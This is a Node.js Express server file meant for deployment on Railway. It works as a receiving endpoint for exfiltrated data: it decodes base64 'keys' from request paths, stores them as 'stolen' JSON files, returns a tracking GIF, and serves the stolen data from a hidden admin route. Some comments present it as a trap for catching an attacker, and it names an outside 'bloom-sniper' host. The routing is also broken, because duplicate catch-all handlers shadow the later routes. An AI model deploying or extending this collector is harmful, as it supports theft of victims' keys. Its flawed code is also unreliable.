// server.js - Deploy this to Railway
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');
const LOGS_FOLDER = path.join(__dirname, 'logs');

if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });

app.set('trust proxy', true);

// Serve loader.js
app.get('*', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = req.ip || req.socket.remoteAddress;
    
    // Extract base64 from URL path - FIX: decodeURIComponent first
    const segments = req.path.split('/').filter(Boolean);
    let encodedData = segments[segments.length - 1] || '';
    
    // URL decode in case characters like +, /, = were encoded
    try {
        encodedData = decodeURIComponent(encodedData);
    } catch(e) {
        // Already decoded or invalid, continue
    }

    console.log(`[${timestamp}] Request from: ${clientIp}`);
    console.log(`Path length: ${encodedData.length}`);

    if (encodedData.length > 40) {
        try {
            // Fix padding if needed
            const padding = 4 - (encodedData.length % 4);
            if (padding !== 4) {
                encodedData += '='.repeat(padding);
            }
            
            const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
            
            // Debug: log first 200 chars
            console.log('Decoded preview:', decodedStr.substring(0, 200));
            
            const data = JSON.parse(decodedStr);

            const output = {
                receivedAt: timestamp,
                ip: clientIp,
                userAgent: data.header || req.headers['user-agent'],
                keysCount: data.keys ? data.keys.length : 0,
                keys: data.keys || [],
                rawSize: decodedStr.length
            };

            const filename = `stolen_${timestamp.replace(/[:.]/g, '-')}.json`;
            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));

            console.log(`✅ SAVED: ${filename} | Keys: ${output.keysCount}`);
        } catch (err) {
            console.error(`❌ Decode error: ${err.message}`);
            console.error(`Data was: ${encodedData.substring(0, 100)}...`);
        }
    }

    // Return 1x1 GIF
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.send(gif);
});

// Health check (what the attacker might check)
app.get('/health', (req, res) => {
    logAccess(req, 'HEALTH_CHECK');
    res.json({
        success: true,
        msg: "OK",
        backfil: "https://bloom-sniper-production.up.railway.app"
    });
});

// Data exfiltration endpoint (font-face trick)
app.get('*', (req, res) => {
    const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
    const timestamp = new Date().toISOString();
    const clientIp = req.ip || req.socket.remoteAddress;
    const realIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || clientIp;
    
    // Log EVERY access with IP (this catches the attacker when they check logs)
    const accessLog = {
        timestamp,
        ip: realIp,
        path: req.path,
        userAgent: req.headers['user-agent'],
        referer: req.headers['referer'] || 'none',
        type: 'DATA_EXFIL'
    };
    
    fs.appendFileSync(
        path.join(LOGS_FOLDER, 'access.log'), 
        JSON.stringify(accessLog) + '\n'
    );

    // Process stolen data
    const segments = req.path.split('/').filter(Boolean);
    const encodedData = segments[segments.length - 1] || '';

    if (encodedData.length > 40) {
        try {
            const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
            const data = JSON.parse(decodedStr);

            const output = {
                receivedAt: timestamp,
                victimIp: realIp,  // This is the victim's IP
                userAgent: data.header || req.headers['user-agent'],
                keysCount: data.keys ? data.keys.length : 0,
                keys: data.keys || []
            };

            const filename = `stolen_${timestamp.replace(/[:.]/g, '-')}.json`;
            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));
            
            console.log(`[+] Data saved: ${filename} | Keys: ${output.keysCount} | From: ${realIp}`);
        } catch (err) {
            console.error(`[!] Decode error: ${err.message}`);
        }
    }

    // Return 1x1 transparent GIF
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.send(gif);
});

function logAccess(req, type) {
    const log = {
        timestamp: new Date().toISOString(),
        type: type,
        ip: req.headers['x-forwarded-for'] || req.ip,
        userAgent: req.headers['user-agent'],
        url: req.originalUrl
    };
    fs.appendFileSync(path.join(LOGS_FOLDER, 'admin_access.log'), JSON.stringify(log) + '\n');
}

// Hidden endpoint to view logs (for you to retrieve evidence)
app.get('/admin/logs', (req, res) => {
    logAccess(req, 'ADMIN_ACCESS');  // This logs the attacker's IP if they find this!
    
    try {
        const accessLogs = fs.readFileSync(path.join(LOGS_FOLDER, 'access.log'), 'utf8')
            .split('\n')
            .filter(Boolean)
            .map(line => JSON.parse(line));
        
        const stolenFiles = fs.readdirSync(DATA_FOLDER)
            .filter(f => f.endsWith('.json'))
            .map(f => JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f))));
        
        res.json({
            accessLogs: accessLogs.slice(-50),  // Last 50 accesses
            stolenData: stolenFiles,
            serverTime: new Date().toISOString()
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});